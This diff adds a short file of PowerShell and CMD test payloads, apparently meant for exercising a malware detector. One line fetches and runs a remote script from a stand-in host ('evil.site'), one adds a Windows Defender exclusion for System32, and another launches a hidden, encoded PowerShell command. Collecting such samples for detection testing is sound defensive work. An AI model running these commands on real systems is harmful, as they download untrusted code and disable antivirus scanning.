@@ -1,0 +1,21 @@
+Simple test payloads
+
+1. Classic PowerShell command
+
+powershell -nop -w hidden -enc SGVsbG8=
+
+2. Encoded PowerShell
+
+IEX(New-Object Net.WebClient).DownloadString('http://evil.site/payload.ps1')
+
+3. CMD-based run
+
+cmd /c calc.exe
+
+4. Suspicious base64 block
+
+VGhpcyBpcyBhIHRlc3QgcGF5bG9hZCBvZiBsb25nIGJhc2U2NA==
+
+5. Bypass example
+
+Set-MpPreference -ExclusionPath "C:\Windows\System32"
